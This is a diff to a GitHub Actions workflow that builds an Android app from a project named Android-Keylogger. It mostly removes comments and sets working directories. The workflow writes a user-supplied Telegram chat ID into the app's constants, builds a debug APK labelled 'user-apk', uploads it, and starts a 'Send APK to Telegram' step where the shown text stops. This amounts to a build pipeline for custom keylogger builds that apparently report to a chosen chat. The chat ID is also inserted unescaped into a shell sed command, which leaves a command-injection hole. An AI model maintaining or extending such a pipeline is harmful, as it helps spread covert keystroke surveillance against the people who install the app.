@@ -9,7 +9,7 @@ on:
 
 jobs:
   build:
-    runs-on: ubuntu-22.04  # Explicitly using Ubuntu 22.04
+    runs-on: ubuntu-22.04
 
     steps:
     - name: Checkout code
@@ -18,25 +18,26 @@ jobs:
     - name: Set up JDK
       uses: actions/setup-java@v3
       with:
-        java-version: '17'  # Set to Java 17 as required by Android Gradle Plugin
-        distribution: 'zulu'  # Use Zulu OpenJDK
+        java-version: '17'
+        distribution: 'zulu'
 
     - name: Set executable permissions for gradlew
-      run: chmod +x Android-Keylogger/AndroidKeylogger/gradlew  # Ensure gradlew is executable
+      run: chmod +x ./gradlew
+      working-directory: Android-Keylogger/AndroidKeylogger
 
     - name: Inject Chat ID into Constants.java
-      run: sed -i 's/CHAT_ID_PLACEHOLDER/${{ github.event.inputs.chat_id }}/g' Android-Keylogger/AndroidKeylogger/app/src/main/java/com/bshu2/androidkeylogger/Constant.java
-      # This step replaces the CHAT_ID_PLACEHOLDER in Constant.java with the chat_id input
+      run: sed -i 's/CHAT_ID_PLACEHOLDER/${{ github.event.inputs.chat_id }}/g' app/src/main/java/com/bshu2/androidkeylogger/Constant.java
+      working-directory: Android-Keylogger/AndroidKeylogger
 
     - name: Build APK
-      run: Android-Keylogger/AndroidKeylogger/gradlew assembleDebug  # Build the APK using Gradle
+      run: ./gradlew assembleDebug
       working-directory: Android-Keylogger/AndroidKeylogger
 
     - name: Upload APK as Artifact
       uses: actions/upload-artifact@v3
       with:
-        name: user-apk  # Name of the artifact to upload
-        path: Android-Keylogger/AndroidKeylogger/app/build/outputs/apk/debug/app-debug.apk  # Path to the generated APK
+        name: user-apk
+        path: Android-Keylogger/AndroidKeylogger/app/build/outputs/apk/debug/app-debug.apk
 
     - name: Send APK to Telegram
       run: |
